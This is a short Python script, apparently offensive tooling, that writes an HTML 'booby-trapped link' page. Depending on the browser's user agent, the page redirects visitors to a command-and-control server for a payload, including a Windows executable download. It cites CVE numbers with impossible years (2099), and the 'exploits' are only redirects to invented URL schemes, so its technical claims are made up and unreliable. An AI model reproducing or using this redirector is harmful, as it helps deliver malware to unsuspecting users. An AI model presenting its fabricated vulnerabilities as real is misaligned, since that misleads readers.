#!/usr/bin/env python3
"""
universal_link_forge.py - رابط ملغم عالمي
يستهدف iOS, Android, Windows, Linux عبر ثغرات WebKit/Blink
"""
def generate_link(c2_server):
    html = f"""<html>
    <head><script>
    var ua = navigator.userAgent;
    if (ua.indexOf('iPhone') > -1) {{
        // استغلال WebKit CVE-2099-0007
        location.href = 'webkit-exploit://{c2_server}/payload';
    }} else if (ua.indexOf('Android') > -1) {{
        // استغلال Chrome CVE-2099-0008
        location.href = 'intent://{c2_server}/payload#Intent;end';
    }} else {{
        // ويندوز/لينكس
        window.location = 'http://{c2_server}/universal_payload.exe';
    }}
    </script></head><body></body></html>"""
    with open("universal_exploit.html", "w") as f:
        f.write(html)
    print("[*] Universal link forged: universal_exploit.html")
    return "universal_exploit.html"
